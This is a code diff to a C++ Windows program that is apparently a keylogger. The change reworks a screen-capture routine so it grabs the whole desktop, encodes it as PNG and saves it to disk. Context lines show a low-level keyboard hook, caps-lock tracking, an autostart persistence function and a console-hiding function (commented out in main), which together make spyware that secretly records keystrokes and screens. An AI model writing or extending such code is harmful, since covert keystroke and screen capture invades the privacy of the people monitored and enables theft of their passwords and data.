@@ -1,5 +1,7 @@
 #include <iostream>
 #include <windows.h>
+#include "lodepng.h"
+
 
 
 using namespace std;
@@ -117,7 +119,7 @@ void addToAutostart()
 
 }
 
-void getScreenshot()
+std::vector<unsigned char> getScreenshot()
 {
     int x  = GetSystemMetrics(SM_XVIRTUALSCREEN);
     int y  = GetSystemMetrics(SM_YVIRTUALSCREEN);
@@ -125,25 +127,68 @@ void getScreenshot()
     int cy = GetSystemMetrics(SM_CYVIRTUALSCREEN);
 
 
+    std::vector<unsigned char> png;
+
+
     HDC dcScreen = GetDC(NULL);
     HDC dcTarget = CreateCompatibleDC(dcScreen);
 
-    HBITMAP bmpTarget = CreateCompatibleBitmap(dcScreen,cx,cy);
-    HGDIOBJ oldBmp = SelectObject(dcTarget, bmpTarget);
-    BitBlt(dcTarget, 0, 0, cx, cy, dcScreen, x, y, SRCCOPY | CAPTUREBLT);
+
+    BITMAPINFO bi{};
+    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+    bi.bmiHeader.biWidth = cx;
+    bi.bmiHeader.biHeight = -cy;
+    bi.bmiHeader.biPlanes = 1;
+    bi.bmiHeader.biBitCount = 32;
+    bi.bmiHeader.biCompression = BI_RGB;
 
 
-    OpenClipboard(NULL);
-    EmptyClipboard();
-    SetClipboardData(CF_BITMAP, bmpTarget);
-    CloseClipboard();
+    void* pixels = nullptr;
 
+    HBITMAP bmpTarget = CreateDIBSection(dcScreen, &bi, DIB_RGB_COLORS, &pixels, NULL, 0);
+
+
+    if (!bmpTarget)
+    {
+        DeleteDC(dcTarget);
+        ReleaseDC(NULL, dcScreen);
+        return{};
+    }
+
+
+     HGDIOBJ oldBmp = SelectObject(dcTarget, bmpTarget);
+
+    BitBlt(dcTarget,0, 0, cx, cy, dcScreen, x, y, SRCCOPY | CAPTUREBLT);
+
+
+    //BGRA to RGBA
+    std::vector<unsigned char> rgba(cx * cy * 4);
+
+    unsigned char* src =
+        static_cast<unsigned char*>(pixels);
+
+    for (int i = 0; i < cx * cy; ++i)
+    {
+        rgba[i * 4 + 0] = src[i * 4 + 2]; // R
+        rgba[i * 4 + 1] = src[i * 4 + 1]; // G
+        rgba[i * 4 + 2] = src[i * 4 + 0]; // B
+        rgba[i * 4 + 3] = 255;             // A
+    }
+
+
+    unsigned error = lodepng::encode(png, rgba, cx, cy, LCT_RGBA, 8);
 
     SelectObject(dcTarget, oldBmp);
     DeleteDC(dcTarget);
     ReleaseDC(NULL,dcScreen);
     DeleteObject(bmpTarget);
 
+    /*for(int i = 0;i<png.size();i++)
+    {
+        std::cout << (int)png[i];
+    }*/
+
+    return png;
 }
 
 int main()
@@ -152,7 +197,7 @@ int main()
     //hideConsoleWindow();
 
     //addToAutostart();
-    getScreenshot();
+    lodepng::save_file(getScreenshot(),"test.png");
     capsLock = (GetKeyState(VK_CAPITAL) & 1) != 0;
     hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, NULL, 0);
     if (hHook == NULL) {
